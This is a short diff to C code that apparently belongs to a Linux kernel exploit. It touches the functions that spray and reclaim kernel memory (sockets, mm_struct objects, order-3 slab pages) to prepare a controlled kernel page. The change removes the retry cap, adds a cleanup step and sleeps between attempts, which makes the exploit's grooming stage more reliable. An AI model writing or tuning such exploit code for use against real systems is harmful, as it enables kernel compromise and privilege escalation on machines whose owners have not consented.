@@ -399,6 +399,7 @@ int prepare_skb_payload(uintptr_t base) {
 uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
+  cleanup_page_prepare_state();
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
@@ -600,12 +601,11 @@ uintptr_t prepare_kernel_page(void) {
 }
 
 uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 4;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
   deadline.tv_sec += 240;
-  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+  for (int attempt = 1;; attempt++) {
     uintptr_t base = prepare_kernel_page();
     if (base) {
       pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
@@ -618,8 +618,9 @@ uintptr_t prepare_good_kernel_page(void) {
       pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
       break;
     }
-    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
-               max_attempts, ms_since(&t_good));
+    pr_warning("prepare_kernel_page retry %d +%lldms\n", attempt,
+               ms_since(&t_good));
+    usleep(200000);
   }
   return 0;
 }
